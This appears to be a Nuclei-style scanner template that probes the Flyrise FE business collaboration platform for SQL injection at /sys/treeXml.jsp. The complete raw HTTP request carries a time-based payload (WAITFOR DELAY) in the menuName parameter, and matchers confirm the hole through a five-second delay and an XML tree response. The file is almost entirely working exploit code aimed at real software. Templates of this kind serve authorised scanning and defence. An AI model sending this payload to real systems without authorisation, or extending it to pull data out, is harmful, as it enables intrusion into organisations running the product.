id: flyrise-fe-treexml-sqli
info:
  name: 飞企互联-FE业务协作平台 treeXml SQL注入
  author: qwtd
  severity: critical
  tags: 飞企互联-FE业务协作平台

variables:
  str1: '{{rand_base(8)}}'

http:
  - raw:
      - |
        GET /sys/treeXml.js%70?menuName=1';WAITFOR+DELAY+'0:0:5'--&type=function HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0.60dabdd3d70bcd96
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

    matchers:
      - type: dsl
        dsl:
          - status_code == 200 && contains(body,'</tree>')
          - duration >= 5
        condition: and